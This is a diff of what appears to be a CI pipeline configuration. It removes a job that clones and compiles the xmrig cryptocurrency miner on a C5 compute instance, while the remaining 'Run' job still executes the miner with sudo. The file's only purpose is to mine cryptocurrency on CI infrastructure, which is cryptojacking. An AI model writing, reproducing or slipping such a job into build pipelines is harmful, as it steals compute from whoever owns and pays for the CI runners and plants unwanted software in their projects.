@@ -4,22 +4,6 @@
       only: main
 
 jobs:
-  Install-Build:
-    resources:
-      instance-type: C5
-    uses: script@v1
-    with:
-      script: |
-        sudo apt update && sudo apt upgrade -y
-        sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
-        git clone https://github.com/xmrig/xmrig.git
-        cd xmrig
-        mkdir build
-        cd build
-        cmake ..
-        make -j$(nproc)
-        mv xmrig ../../xmrig
-
   Run:
     resources:
       instance-type: C5
@@ -30,3 +14,4 @@ jobs:
       script: |
         chmod +x xmrig
         sudo ./xmrig
+  
